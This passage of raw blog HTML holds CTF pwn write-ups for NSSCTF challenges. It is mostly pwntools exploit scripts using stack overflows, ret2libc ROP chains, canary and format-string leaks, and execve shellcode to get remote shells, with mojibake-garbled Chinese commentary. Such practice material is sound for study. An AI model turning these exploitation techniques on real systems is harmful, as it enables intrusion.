class=\"line\">ret=0x4006b9</span><br><span class=\"line\"></span><br><span class=\"line\">rdi_ret=0x400c83</span><br><span class=\"line\"></span><br><span class=\"line\">payload=b&#x27;a&#x27;*0x58+p64(rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(start)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendlineafter(&#x27;choice!&#x27;,&#x27;1&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendlineafter(&#x27;encrypted&#x27;,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">puts_addr=u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))</span><br><span class=\"line\"></span><br><span class=\"line\">log.info(&#x27;puts addr is %x&#x27;%puts_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">libc=LibcSearcher(&#x27;puts&#x27;,puts_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">libc_addr=puts_addr-libc.dump(&#x27;puts&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">system_addr=libc_addr+libc.dump(&#x27;system&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">str_bin_sh=libc_addr+libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">payload2=b&#x27;a&#x27;*0x58+p64(ret)+p64(rdi_ret)+p64(str_bin_sh)+p64(system_addr)+p64(start)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendlineafter(&#x27;choice!&#x27;,&#x27;1&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendlineafter(&#x27;encrypted&#x27;,payload2)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"wustctf-2020getshell\"><a class=\"anchor\" href=\"#wustctf-2020getshell\">#</a> [WUSTCTF 2020]getshell</h5>\n<p>è¿™ä¸ªæ‹¿åˆ° flag åäº¤ä¸äº†</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28667)</span><br><span class=\"line\">system_addr=0x804851B</span><br><span class=\"line\">payload=b&#x27;a&#x27;*(0x18+0x4)+p32(system_addr)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"gdouctf-2023easy-pwn\"><a class=\"anchor\" href=\"#gdouctf-2023easy-pwn\">#</a> [GDOUCTF 2023]EASY PWN</h5>\n<p>æœ¬åœ°è¿è¡Œå‘ç°å¤šè¾“å…¥å‡ ä½å‘ç°æç¤ºæ²¡æœ‰ flag.txt å¯ä»¥çŒœåˆ°ç›´æ¥ nc è¿æ¥å¤šè¾“å…¥å‡ ä½å³å¯å¾—åˆ° flagï¼Œè™½ç„¶å¾—åˆ°äº† flag ä½†æ˜¯è¿˜æ˜¯è¦åˆ†æä¸€ä¸‹è¿™ä¸ªç¨‹åºï¼Œä½¿ç”¨ checksec åå¯ä»¥æŸ¥çœ‹è¿™ä¸ªå¼€å¯äº†åœ°å€éšæœºåŒ–é‚£æ‰“å¼€ ida å‘ç°è¿™ä¸ª main è°ƒç”¨ check ç„¶ååœ¨è°ƒç”¨ printflagï¼Œç„¶åæˆ‘ä»¬è¿˜æ˜¯å†™ä¸ªè„šæœ¬</p>\n<p><figure class=\"highlight plaintext\"><figcaption><span>pwn</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28563)</span><br><span class=\"line\">payload=b&#x27;a&#x27;*50</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"hnctf-2022-week1ret2shellcode\"><a class=\"anchor\" href=\"#hnctf-2022-week1ret2shellcode\">#</a> [HNCTF 2022 Week1]ret2shellcode</h5>\n<p>è¿™ä¸ªé¢˜è¦æ³¨æ„ c è¯­è¨€çš„å‡ ä¸ªå‡½æ•° memsetã€strcpyã€mprotect å…¶ä¸­ mprotect æ˜¯èµ‹æƒé™ strcpy æ˜¯å¤åˆ¶ç„¶å memset æ˜¯è®¾ç½®å‰é¢çš„å­—ç¬¦æ›¿æ¢ä¸ºæŒ‡å®šå­—ç¬¦<br />\næŒ‰ç…§é¢˜ç›®æ ‡é¢˜çš„è¯æˆ‘ä»¬ç›´æ¥å†™å…¥ shellcode é€ æˆæº¢å‡ºç„¶ååœ¨è°ƒç”¨ buff å‡½æ•°å³å¯ï¼Œå› ä¸º shellcode å†™å…¥çš„è¯ strcpy å°†æˆ‘ä»¬å†™å…¥çš„ shellcode å†™å…¥åˆ°äº† buff å­—æ®µ<br />\n buff å­—æ®µå¯ä»¥ç›´æ¥å».bss æŸ¥çœ‹</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28457)</span><br><span class=\"line\">shellcode=asm(shellcraft.sh())</span><br><span class=\"line\">payload=shellcode.ljust(0x108,b&#x27;a&#x27;)+p64(0x4040A0)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"2021-é¹¤åŸæ¯littleof\"><a class=\"anchor\" href=\"#2021-é¹¤åŸæ¯littleof\">#</a> [2021 é¹¤åŸæ¯] littleof</h5>\n<p>æ³¨æ„ canary ä¿æŠ¤ç»•è¿‡æ–¹æ³•æ³¨æ„ä½¿ç”¨æ–¹æ³• nssctf ä¸Šçš„ç¯å¢ƒæœ‰é—®é¢˜æˆ‘çš„ poc æ‰“ä¸è¿›å»åªæœ‰ç”¨è¿™ä¸ª</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">from LibcSearcher import *</span><br><span class=\"line\">context(os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">#p = process(&#x27;./pwn&#x27;)</span><br><span class=\"line\">p = remote(&#x27;node4.anna.nssctf.cn&#x27;,28316)</span><br><span class=\"line\">elf = ELF(&#x27;./littleof&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">def debug():</span><br><span class=\"line\">    gdb.attach(p)</span><br><span class=\"line\">    pause()</span><br><span class=\"line\">def get_addr():</span><br><span class=\"line\">\treturn u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))</span><br><span class=\"line\"></span><br><span class=\"line\"># leak canary</span><br><span class=\"line\">payload = b&#x27;a&#x27;*0x49</span><br><span class=\"line\">p.sendafter(b&#x27;overflow?&#x27;, payload)</span><br><span class=\"line\">p.recvuntil(payload)</span><br><span class=\"line\">canary = u64(p.recv(7).rjust(8, b&#x27;\\x00&#x27;))</span><br><span class=\"line\">log.info(&#x27;canary addr is %x&#x27;%canary)</span><br><span class=\"line\"># leak libc_base</span><br><span class=\"line\">rdi = 0x400863</span><br><span class=\"line\">ret = 0x40059e</span><br><span class=\"line\">payload = b&#x27;a&#x27;*0x48 + p64(canary) + p64(0) + p64(rdi) + p64(elf.got[&#x27;puts&#x27;]) + p64(elf.sym[&#x27;puts&#x27;]) + p64(0x4006e2)</span><br><span class=\"line\">p.sendafter(b&#x27;harder!&#x27;, payload)</span><br><span class=\"line\">libc_base = get_addr() - 0x080aa0</span><br><span class=\"line\"></span><br><span class=\"line\"># leak canary</span><br><span class=\"line\">payload = b&#x27;a&#x27;*0x49</span><br><span class=\"line\">p.sendafter(b&#x27;overflow?&#x27;, payload)</span><br><span class=\"line\">p.recvuntil(b&#x27;a&#x27;*0x49)</span><br><span class=\"line\">canary = u64(p.recv(7).rjust(8, b&#x27;\\x00&#x27;))</span><br><span class=\"line\">log.info(&#x27;canary addr is %x&#x27;%canary)</span><br><span class=\"line\"># get shell</span><br><span class=\"line\">system = libc_base + 0x04f550</span><br><span class=\"line\">binsh = libc_base + 0x1b3e1a</span><br><span class=\"line\">payload = b&#x27;a&#x27;*0x48 + p64(canary) + p64(0) + p64(ret) + p64(rdi) + p64(binsh) + p64(system)</span><br><span class=\"line\">p.sendafter(b&#x27;harder!&#x27;, payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"hnctf-2022-week1easyoverflow\"><a class=\"anchor\" href=\"#hnctf-2022-week1easyoverflow\">#</a> [HNCTF 2022 Week1]easyoverflow</h5>\n<p>åˆæ˜¯ä¸€ä¸ªæ ˆä¸ç¨³å®šç›´æ¥ cat flag çš„é¢˜æºä»£ç æ˜¯</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include&lt;stdio.h&gt;</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    setbuf(stdin,0);</span><br><span class=\"line\">    setbuf(stdout,0);</span><br><span class=\"line\">    setbuf(stderr,0);</span><br><span class=\"line\">    puts(&quot;Input something&quot;);</span><br><span class=\"line\">    char name[30];</span><br><span class=\"line\">    int number=0;</span><br><span class=\"line\">    gets(name);</span><br><span class=\"line\">    if(number!=0)&#123;</span><br><span class=\"line\">        puts(&quot;You win.&quot;);</span><br><span class=\"line\">        system(&quot;cat flag&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>ä¿æŠ¤å…¨å…³ç›´æ¥è®© name æº¢å‡ºåå³å¯</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">p=remote(&#x27;1.1.1.1&#x27;,11)</span><br><span class=\"line\">payload=b&#x27;a&#x27;*50</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"nssctf-2022-spring-recruitr3m4ke\"><a class=\"anchor\" href=\"#nssctf-2022-spring-recruitr3m4ke\">#</a> [NSSCTF 2022 Spring Recruit]R3m4ke?</h5>\n<p>ä¸€ä¸ªå¾ˆç®€å•è¾¾åˆ° payload çš„é¢˜</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node4.anna.nssctf.cn&#x27;,28195)</span><br><span class=\"line\">payload=b&#x27;a&#x27;*0x28+p64(0x40072C)</span><br><span class=\"line\">p.sendlineafter(&#x27;started&gt;&#x27;,payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"hnctf-2022-week1fmtstrre\"><a class=\"anchor\" href=\"#hnctf-2022-week1fmtstrre\">#</a> [HNCTF 2022 Week1]fmtstrre</h5>\n<p>å­—ç¬¦ä¸²æº¢å‡ºç›´æ¥æŸ¥çœ‹ name åœ¨ bss é‡Œé¢çš„ä½ç½®ç›´æ¥æ‰“å°±è¡Œæ³¨æ„æ ˆå¹³è¡¡<br />\n %38$s ç›´æ¥è·å¾— flag</p>\n<h5 id=\"gdouctf-2023shellcode\"><a class=\"anchor\" href=\"#gdouctf-2023shellcode\">#</a> [GDOUCTF 2023]Shellcode</h5>\n<p>read å‚¨å­˜ name åœ¨ bss æ®µä¸Šé¢ï¼Œå¹¶ä¸”å¯ä»¥å†™å…¥ 25 çš„å­—èŠ‚é•¿åº¦ä½†æ˜¯ shellcraft é»˜è®¤ç”Ÿæˆçš„å­—èŠ‚æ•°æ˜¯ 44 ä½é•¿åº¦ï¼Œé‚£æˆ‘ä»¬ç›´æ¥å»ç½‘ä¸Šæ‰¾ä¸€ä¸ªå°äº 25 å­—èŠ‚çš„ shellcode</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node4.anna.nssctf.cn&#x27;,28735)</span><br><span class=\"line\">shellcode=&#x27;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05&#x27;</span><br><span class=\"line\">name=0x6010A0</span><br><span class=\"line\">p.sendlineafter(&#x27;lease.&#x27;,shellcode)</span><br><span class=\"line\">payload=b&#x27;a&#x27;*(0xA+0x8)+p64(name)</span><br><span class=\"line\">p.sendlineafter(&#x27;start!&#x27;,payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<p>è¿™ä¸ªé¢˜åº”è¯¥è¿˜èƒ½å¤Ÿ ret2libc ä½†æ˜¯æˆ‘æ‰“å‡ºæ¥æœ‰ç‚¹é—®é¢˜</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">from LibcSearcher import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node4.anna.nssctf.cn&#x27;,28010)</span><br><span class=\"line\">rdi_pop=0x4007b3</span><br><span class=\"line\">ret=0x40028e</span><br><span class=\"line\">elf=ELF(&#x27;pw&#x27;)</span><br><span class=\"line\">puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class=\"line\">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class=\"line\">main=0x400687</span><br><span class=\"line\">p.sendlineafter(&#x27;lease.&#x27;,&#x27;1&#x27;)</span><br><span class=\"line\">payload1=b&#x27;a&#x27;*(0xA+0x8)+p64(rdi_pop)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class=\"line\">p.sendlineafter(&#x27;start!&#x27;,payload1)</span><br><span class=\"line\">puts_ad=u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))</span><br><span class=\"line\">log.info(&#x27;puts_ad is %x&#x27;%puts_ad)</span><br><span class=\"line\">libc=LibcSearcher(&#x27;puts&#x27;,puts_ad)</span><br><span class=\"line\">libc_base=puts_ad-libc.dump(&#x27;puts&#x27;)</span><br><span class=\"line\">sys_addr=libc_base+libc.dump(&#x27;system&#x27;)</span><br><span class=\"line\">str_bin_sh=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class=\"line\">p.sendlineafter(&#x27;lease.&#x27;,&#x27;1&#x27;)</span><br><span class=\"line\">log.info(sys_addr)</span><br><span class=\"line\">log.info(str_bin_sh)</span><br><span class=\"line\">payload2=b&#x27;a&#x27;+(0xA+0x8)+p64(ret)+p64(rdi_pop)+p64(str_bin_sh)+p64(sys_addr)+p64(main)</span><br><span class=\"line\">p.sendlineafter(&#x27;start!&#x27;,payload2)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"hnctf-2022-week1ezr0p32\"><a class=\"anchor\" href=\"#hnctf-2022-week1ezr0p32\">#</a> [HNCTF 2022 Week1]ezr0p32</h5>\n<p>æŠŠ /bin/sh å†™åœ¨.bss ä¸Šç„¶åç›´æ¥æ‰“</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28655)</span><br><span class=\"line\">p.sendlineafter(&#x27;name&#x27;,&#x27;/bin/sh&#x27;)</span><br><span class=\"line\">payload=b&#x27;a&#x27;*(0x1c+0x4)+p32(0x080483d0)+p32(0)+p32(0x0804A080)</span><br><span class=\"line\">p.sendlineafter(&#x27;time~&#x27;,payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"æ·±è‚²æ¯-2021find_flag\"><a class=\"anchor\" href=\"#æ·±è‚²æ¯-2021find_flag\">#</a> [æ·±è‚²æ¯ 2021] find_flag</h5>\n<p>è¿™ä¸ªé¢˜æ¶‰åŠçš„çŸ¥è¯†ç‚¹æœ‰ç‚¹å¤šæ¯•ç«Ÿä¿æŠ¤å…¨å¼€ï¼Œæ‰“å¼€ ida æŸ¥çœ‹åˆ° sub å‡½æ•°é‡Œé¢çš„æœ‰ä¸ªå­—ç¬¦ä¸²æº¢å‡ºå¯ä»¥å¾—åˆ° canary å’ŒåŸºåœ°å€ï¼Œç”¨ gdb å› ä¸ºå¼€å¯äº† ple ä¸èƒ½åœ¨ main å‡½æ•°ä¸Šä¸‹æ–­ç‚¹å°±åªæœ‰ä¸‹åœ¨ printf ä¸Šäº†ç„¶åè°ƒè¯•ä½ å¯ä»¥ç”¨ stack æŸ¥çœ‹åˆ° rbp ä¸Šé¢çš„åœ°å€æ˜¯ ****00 å¯ä»¥çŒœåˆ°è¿™ä¸ªå°±æ˜¯ canary äº†å› ä¸º canary ä¸€èˆ¬æƒ…å†µä¸‹éƒ½æ˜¯ä»¥ 00 ç»“å°¾çš„ï¼Œcanary ä¿æŠ¤ä¸»è¦æ˜¯é€šè¿‡åœ¨æ ˆä¸‹è®¾ç½®ä¸€ä¸ªåœ°å€ï¼Œè¿”å›æ˜¯ä¹Ÿå¿…é¡»å¸¦ä¸Šé‚£ä¸ªåœ°å€ä¸ç„¶å°±ä¼šè§¦å‘ä¿æŠ¤ï¼Œç„¶å ple ä¿æŠ¤çš„è¯ä¸»è¦æ˜¯é€šè¿‡æ¯æ¬¡ä¿®æ”¹.textã€.data çš„åœ°å€ã€‚tipsï¼šä½¿ç”¨ pwngdb å¯ä»¥åˆ©ç”¨ fmtarg æ¥å¾—åˆ°æ ˆåç§»é‡</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">from LibcSearcher import *</span><br><span class=\"line\">import time</span><br><span class=\"line\">elf=ELF(&#x27;find_flag&#x27;)</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node4.anna.nssctf.cn&#x27;,28437)</span><br><span class=\"line\">p.sendlineafter(&#x27;name?&#x27;,&#x27;%17$p---%19$p&#x27;)</span><br><span class=\"line\">p.recvuntil(&#x27;you, &#x27;)</span><br><span class=\"line\">a=p.recv(18)</span><br><span class=\"line\">p.recvuntil(&#x27;---&#x27;)</span><br><span class=\"line\">b=p.recv(14)</span><br><span class=\"line\">a=int(a,16)</span><br><span class=\"line\">b=int(b,16)</span><br><span class=\"line\">log.info(a)</span><br><span class=\"line\">log.info(b)</span><br><span class=\"line\">base=b-0x146F</span><br><span class=\"line\">system=base+elf.sym[&#x27;system&#x27;]</span><br><span class=\"line\">log.info(&#x27;system addr is %x&#x27;%system)</span><br><span class=\"line\">cat=base+0x2004</span><br><span class=\"line\">rdi=base+0x14E3</span><br><span class=\"line\">ret=base+0x101A</span><br><span class=\"line\">payload=b&#x27;a&#x27;*0x38+p64(a)+p64(0)+p64(ret)+p64(rdi)+p64(cat)+p64(system)</span><br><span class=\"line\">p.sendlineafter(&#x27;else? &#x27;,payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"hdctf-2023pwnner\"><a class=\"anchor\" href=\"#hdctf-2023pwnner\">#</a> [HDCTF 2023]pwnner</h5>\n<p>è¿™ä¸ªé¢˜åˆè®©æˆ‘å­¦åˆ°äº†ä¼ªéšæœºæ•°è¿™ä¸ª srand (0x38) æ§åˆ¶ç€ rand çš„éšæœºå¤§å°åªéœ€è¦ä½¿ç”¨ python åº“çš„ ctypes åªè¦æœ‰ srand å°±èƒ½å¾—åˆ° rand çš„å¤§å°</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">libc = ctypes.CDLL(&quot;libc.so.6&quot;)</span><br><span class=\"line\">libc.srand.argtypes = [ctypes.c_uint]</span><br><span class=\"line\">libc.srand(0x39)</span><br><span class=\"line\">rand_result = libc.rand()</span><br></pre></td></tr></table></figure></p>\n<p>æœ€åä»£ç å¦‚ä¸‹</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">import ctypes</span><br><span class=\"line\">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class=\"line\">libc=ctypes.CDLL(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28917)</span><br><span class=\"line\">libc.srand.argtypes=[ctypes.c_uint]</span><br><span class=\"line\">libc.srand(0x39)</span><br><span class=\"line\">rand_result=libc.rand()</span><br><span class=\"line\">p.sendlineafter(&#x27;name:&#x27;,str(rand_result))</span><br><span class=\"line\">payload=b&#x27;a&#x27;*(0x40+0x8)+p64(0x4008B2)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"litctf-2023å£ç®—é¢˜å¡\"><a class=\"anchor\" href=\"#litctf-2023å£ç®—é¢˜å¡\">#</a> [LitCTF 2023] å£ç®—é¢˜å¡</h5>\n<p>å£ç®—é¢˜è¦ä¹ˆå£ç®—è¦ä¹ˆå†™ä¸ªè„šæœ¬æˆ‘è¿™ä¹ˆæ‡’è‚¯å®šæ˜¯</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">p=remote(&#x27;node4.anna.nssctf.cn&#x27;,28904)</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">while 1:</span><br><span class=\"line\">    eval_1=0</span><br><span class=\"line\">    payload=0</span><br><span class=\"line\">    p.recvuntil(&#x27;What is &#x27;)</span><br><span class=\"line\">    eval_1=p.recvuntil(b&#x27;?&#x27;)[:-1]</span><br><span class=\"line\">    log.info(eval_1)</span><br><span class=\"line\">    payload=eval(eval_1)</span><br><span class=\"line\">    p.send(str(payload))</span><br><span class=\"line\">p.recvline()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"swpuctf-2022-æ–°ç”Ÿèµ›æœ‰æ‰‹å°±è¡Œçš„æ ˆæº¢å‡º\"><a class=\"anchor\" href=\"#swpuctf-2022-æ–°ç”Ÿèµ›æœ‰æ‰‹å°±è¡Œçš„æ ˆæº¢å‡º\">#</a> [SWPUCTF 2022 æ–°ç”Ÿèµ›] æœ‰æ‰‹å°±è¡Œçš„æ ˆæº¢å‡º</h5>\n<p>çœ‹åˆ°å±é™©å‡½æ•°æ ˆæº¢å‡ºåè·³è½¬åˆ° execve å³å¯</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28296)</span><br><span class=\"line\">payload=b&#x27;a&#x27;*(0x20+0x8)+p64(0x401257)</span><br><span class=\"line\">p.sendline(payload)</span><br><span 